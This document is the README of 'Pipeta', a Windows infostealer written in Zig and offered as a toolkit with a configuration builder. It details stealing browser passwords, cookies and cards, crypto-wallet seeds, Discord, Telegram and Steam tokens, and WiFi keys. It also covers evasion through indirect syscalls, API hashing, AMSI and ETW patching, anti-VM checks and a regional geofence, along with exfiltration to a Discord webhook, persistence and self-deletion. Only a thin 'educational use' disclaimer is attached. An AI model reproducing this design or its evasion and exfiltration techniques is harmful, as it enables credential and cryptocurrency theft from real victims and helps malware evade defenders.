<div align="center">

# Pipeta

**Windows post-exploitation collection toolkit — credentials, tokens, wallets & files**

*gotinha por gotinha*

[![Zig](https://img.shields.io/badge/Zig-0.16.0-F7A41D?style=flat&logo=zig)](https://ziglang.org)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat&logo=windows)]()

</div>

---

> Educational and authorized security research only. You are solely responsible for your actions.

## Overview

Pipeta is a single-binary Windows collection toolkit written in Zig. It harvests
browser credentials, session tokens, crypto-wallet data, system information and
targeted files, with an anti-analysis gate, per-string obfuscation, local ZIP
packaging and webhook exfiltration. Persistence and self-delete are optional.
A PySide6 + QML builder (`builder/`) generates the configuration and
cross-compiles the binary.

## What it does

| Module | Description |
|--------|-------------|
| **Browser extraction** | Chrome, Edge, Brave, Opera / Opera GX (Chromium SQLite DBs) + Firefox (NSS) — passwords, cookies, cards, history |
| **App-Bound Encryption** | Chrome 127+ `app_bound_encrypted_key` decrypted through the Google Update `IElevator` COM service (`abe.zig`) |
| **Crypto wallets** | 8 desktop wallets + 18 browser-extension wallets (seed/keystore folders copied to `%TEMP%`) |
| **Token capture** | Discord (plaintext token scan), Telegram `tdata`, Steam `ssfn` + config, FileZilla, Outlook Credential Manager, Thunderbird (NSS) |
| **System recon** | OS build, CPU cores, RAM, hostname, user, local IPv4, clipboard, screenshot (GDI+) |
| **WiFi** | Saved profiles + cleartext keys via `wlanapi.dll`, with `netsh` fallback |
| **File grabber** | Recursive collection by extension (.key, .pem, .wallet, .rdp, .kdbx, docs, ...) with a per-file size cap |
| **Evasion** | Indirect syscalls, PEB walking, API hashing, per-string XOR + stack strings, anti-VM/anti-debug/anti-sandbox, langid geofence |
| **Exfiltration** | Discord-compatible webhook via dynamic WinHTTP: JSON (chunked) + multipart ZIP upload, retry and local fallback |
| **Persistence** | `HKCU\...\Run` key via dynamically resolved ADVAPI32 |
| **Self-delete** | `MoveFileExW` with `MOVEFILE_DELAY_UNTIL_REBOOT` (no cmd.exe, no .bat) |

## Builder GUI

`builder/` is a PySide6 + QML desktop app that edits every runtime toggle, previews
the generated `src/ajuste.zig`, and runs `zig build` for you.

```bash
cd builder
python -m venv .venv && . .venv/bin/activate   # or use the bundled .venv
pip install -r requirements.txt                 # PySide6 >= 6.6
python main.py
```

The builder writes a complete, self-contained `src/ajuste.zig` (module switches,
geofence, file-grabber lists, process blocklist, webhook endpoint and the
string-decoding helpers) and shells out to `zig build -Dtarget=<target>
-Doptimize=<mode>`.

## Quick start

```bash
# Cross-compile from Linux (requires Zig 0.16.0)
zig build -Dtarget=x86_64-windows-gnu -Doptimize=ReleaseSmall
zig build -Dtarget=x86_64-windows-gnu -Doptimize=ReleaseFast
```

Output: `zig-out/bin/pipetastealer.exe`

| Flag | Size | Speed | Use case |
|------|------|-------|----------|
| `Debug` | large | slow | Development |
| `ReleaseSmall` | ~605 KB | good | Production |
| `ReleaseFast` | ~1008 KB | best | Testing |

Only `x86_64-windows-gnu` is supported: the indirect-syscall stubs are x86_64
assembly, and Zig cannot provide libc for the MSVC Windows targets on Linux.

The binary produces no console window (`exe.subsystem = .Windows`). SQLite is
**not** statically linked: `extrair.zig` resolves `sqlite3.dll` / `winsqlite3.dll`
at runtime (Windows 10+ ships `winsqlite3.dll`), so there is no bundled
amalgamation in the build.

## Configuration

Runtime configuration lives in `src/ajuste.zig` and is normally written by the
builder. The effective module switches are:

| Constant | Wired? | Effect |
|----------|:------:|--------|
| `roubar_navegadores` | yes | Chromium + Firefox extraction |
| `roubar_crypto` | yes | Extension + desktop wallets |
| `roubar_discord` | yes | Discord token scan |
| `roubar_telegram` | yes | Telegram `tdata` |
| `roubar_steam` | yes | Steam session files |
| `roubar_filezilla` | yes | FileZilla credentials |
| `roubar_outlook` | yes | Windows Credential Manager |
| `roubar_wifi` | yes | WiFi profiles |
| `tirar_captura` | yes | Screenshot |
| `coletar_info_sistema` | yes | System info |
| `pegador_arquivos` | yes | File grabber |
| `persistir` | yes | HKCU Run key |
| `auto_destruir` | yes | Self-delete on reboot |
| `roubar_thunderbird` | yes | Thunderbird NSS extraction |
| `anti_vm` | yes | VM/sandbox checks (CPUID hypervisor bit, MAC OUI, sandbox DLLs, uptime, cores, sleep-skew) |
| `anti_debug` | yes | `PEB.BeingDebugged` / `NtGlobalFlag`, `CheckRemoteDebuggerPresent`, `rdtsc` |
| `human_interaction` | yes | Waits ~2 s for mouse movement or a keypress |

File grabber tuning in `ajuste.zig`:

```zig
pub const tamanho_max_arquivo: i64 = 5 * 1024 * 1024;   // per-file cap
pub const max_screenshot_size: usize = 10 * 1024 * 1024;
```

Extension and search-path lists are stored XOR-obfuscated (`extensoes_arquivo_obf`,
`caminhos_pegador_obf`) and decoded at runtime via `getExtensoes` / `getCaminhos`.

### String obfuscation

`obf.zig` provides comptime per-string obfuscation with a key derived from the
string itself, so no single key recovers the whole binary:

```zig
// comptime XOR, key embedded as first byte
const name = obf.xorStr("discord.com");

// decrypt to heap
const plain = try obf.dexor(allocator, &name);

// decrypt onto the stack (no heap)
const buf = obf.decToStack("ole32.dll");
```

API names can be resolved by FNV-1a hash instead of string, keeping function
names out of memory at runtime:

```zig
const addr = obf.getProcAddressByHash(module_base, comptime obf.apiHash("GetTickCount64"));
```

`ajuste.decAlloc` (base64 + 16-byte XOR key) is retained for legacy callers.

## Stealth architecture

| Technique | Implementation |
|-----------|---------------|
| **Indirect syscalls** | `resolveSSN` + a cached `syscall; ret` (0x0F 0x05 0xC3) gadget inside ntdll `.text`, so the `syscall` never originates in our image |
| **SSN resolution** | Hell's Gate + Halo's Gate (`ssn.zig`) — reads SSNs from unhooked stubs or counts forward from the nearest clean neighbor |
| **PEB walking** | Manual DLL base resolution via `gs:0x60` — no `GetModuleHandle` / `GetProcAddress` in the IAT |
| **API hashing** | FNV-1a 32-bit export walking — only `u32` constants in the binary |
| **String obfuscation** | Per-string comptime XOR, stack strings, base64 legacy |
| **Anti-VM** | CPUID hypervisor bit, MAC OUI prefixes, sandbox DLLs (`sbiedll`, `dbghelp`, `vmcheck`, ...), VM/sandbox process scan |
| **Anti-debug** | `PEB.BeingDebugged`, `PEB.NtGlobalFlag`, `CheckRemoteDebuggerPresent`, `rdtsc` delta |
| **Anti-sandbox** | Uptime > 10 min, CPU cores >= 2, sleep-skew check (patched `Sleep`) |
| **Human interaction** | Waits ~2 s for mouse movement or a keypress |
| **Geofence** | Aborts on langid 0x0419 / 0x0422 / 0x0423 (RU / UA / BY) |
| **Clean IAT** | WinHTTP, ADVAPI32, OLE32, wlanapi, user32, iphlpapi, sqlite3, ntdll all resolved at runtime |

A memory-patching helper (`furtivo.patchMemory` via `NtProtectVirtualMemory`) is
used to neuter AMSI (`AmsiScanBuffer`) and ETW (`EtwEventWrite`) in-process at
startup; missing modules are skipped.

## Exfiltration

`saida.zig` speaks WinHTTP with dynamically resolved functions.

1. Collected data is serialized to JSON (`coleta.toJson`) and sent to the
   configured webhook — split into chunks when large.
2. Grabbed files, wallet folders, `tdata`, Steam files and the screenshot are
   packed into a store-mode ZIP (`zipper.zig`, no compression) and uploaded as
   `multipart/form-data` with a runtime-random boundary.
3. Uploads are capped at 25 MB (Discord free-tier limit).
4. `sendRequestRetry` retries 3 times with 2 s back-off; on final failure the
   payload is written to `%TEMP%\pipeta_fallback.json`.
5. `limpeza.zig` removes all `pipeta_*` temp artifacts afterwards.

The webhook host and path are read from `ajuste.webhook_host_obf` /
`ajuste.webhook_path_obf` (XOR-obfuscated at rest), so they are configured by
the builder rather than hard-coded.

## Project structure

```
pipetastealer/
├── build.zig                  Zig build config (subsystem=Windows, link_libc)
├── builder/                   PySide6 + QML config GUI
│   ├── main.py                Backend: model, ajuste.zig generation, zig build
│   ├── main.qml               UI (dark / magenta theme)
│   ├── requirements.txt       PySide6 >= 6.6
│   └── screenshot.png
├── src/
│   ├── main.zig               Entry point & orchestration
│   ├── ajuste.zig             Config + XOR/base64 string helper + obfuscated lists
│   ├── obf.zig                Per-string XOR, FNV-1a API hashing, stack strings, export walking
│   ├── coleta.zig             Data model + JSON serialization
│   ├── furtivo.zig            Anti-analysis gate, PEB module resolution, memory patching
│   ├── extrair.zig            Chromium extraction (dynamic SQLite, DPAPI, ABE)
│   ├── abe.zig                Chrome App-Bound Encryption via IElevator COM
│   ├── firefox.zig            Firefox NSS extraction
│   ├── capturar.zig           Discord, Telegram, Steam, FileZilla, Outlook, Thunderbird
│   ├── cofrinho.zig           Crypto wallet (extension + desktop) collection
│   ├── sondar.zig             System info, clipboard, screenshot, WiFi, file grabber
│   ├── dpapi.zig              CryptUnprotectData + AES-256-GCM
│   ├── fixar.zig              Persistence (dynamic ADVAPI32) + self-delete (MoveFileExW)
│   ├── saida.zig              WinHTTP exfiltration (JSON + multipart ZIP)
│   ├── zipper.zig             Minimal store-mode ZIP writer
│   ├── limpeza.zig            Temp artifact cleanup
│   ├── winfs.zig              Filesystem helpers (shared-mode copy for locked DBs)
│   └── direto/                Direct/indirect syscalls
│       ├── direto.zig         Syscall wrappers (NtProtectVirtualMemory, NtDelayExecution)
│       ├── ntdll.zig          PEB lookup + ntdll `syscall; ret` gadget scan
│       └── ssn.zig            Hell's Gate + Halo's Gate SSN resolution
├── LICENSE
└── README.md
```

## Supported targets

<details>
<summary><b>Browsers</b></summary>

- Google Chrome
- Microsoft Edge
- Brave
- Opera / Opera GX
- Firefox (via NSS `PK11SDR_Decrypt`)

</details>

<details>
<summary><b>Crypto wallets (desktop)</b></summary>

- Exodus
- Electrum / Electrum-LTC
- Atomic Wallet
- Coinomi
- Ledger Live
- Trezor Suite
- Wasabi Wallet

</details>

<details>
<summary><b>Browser-extension wallets &amp; vaults</b></summary>

MetaMask, Binance, Phantom, Coinbase, Ronin, Trust Wallet, OKX Wallet, Rabby,
Temple, Solflare, Backpack, Frame, Authenticator, Authy, Bitwarden,
KeePassXC-Browser, 1Password, Dashlane.

Roots scanned: Chrome / Edge / Brave `User Data`, profiles `Default` +
`Profile 1..3`.

</details>

<details>
<summary><b>Tokens &amp; sessions</b></summary>

- Discord (plaintext token scan across Discord / Canary / PTB, MFA + regular token shapes)
- Telegram Desktop (`tdata`)
- Steam (`ssfn` remember-me files + config/login VDF)
- FileZilla (`recentservers.xml` / `sitemanager.xml`, base64 password decoding)
- Outlook (Windows Credential Manager)
- Thunderbird (NSS profile)

</details>

## Build requirements

- Zig 0.16.0+
- Python 3.11+ and PySide6 6.6+ (builder GUI only)
- Linux/macOS cross-compilation works; running the binary requires Windows

## Notes

- The builder generates the complete `src/ajuste.zig`; every switch, the
  geofence langids, the file-grabber lists, the process blocklist and the
  webhook endpoint are consumed by the runtime.
- `indirect_syscalls`, `api_hashing` and `stack_strings` are build techniques
  that are always on (see **Stealth architecture**) rather than runtime
  toggles, so they are not exposed in the builder.
- Export resolution (`obf.zig`) also follows PE forwarded exports, so APIs that
  `kernel32.dll` re-exports from `kernelbase.dll` still resolve correctly.
- Decrypted credential blobs are sanitized to valid UTF-8 before JSON
  serialization, so binary data can never produce a malformed document.
- The exfil fallback `%TEMP%\pipeta_fallback.json` is intentionally **not**
  deleted by the cleanup pass — it is the last-resort copy written when the
  webhook is unreachable.
- `persistir` and `auto_destruir` are mutually exclusive in practice: self-delete
  renames the binary, so a Run key for the original path would dangle. When both
  are enabled, self-delete wins and persistence is skipped.
- `obf.decToStack` and `obf.dexorLegacy` are retained as helpers but not
  currently used by the collection path.
- Host-side unit tests exist for the pure logic (`json`, `zipper`, `coleta`,
  `obf`): `zig test src/<file>.zig`.

## License

MIT — see [LICENSE](LICENSE)

## Disclaimer

This project is provided for educational and authorized security research
purposes only. The author assumes no liability and is not responsible for any
misuse or damage. You are solely responsible for ensuring your use complies with
applicable laws.
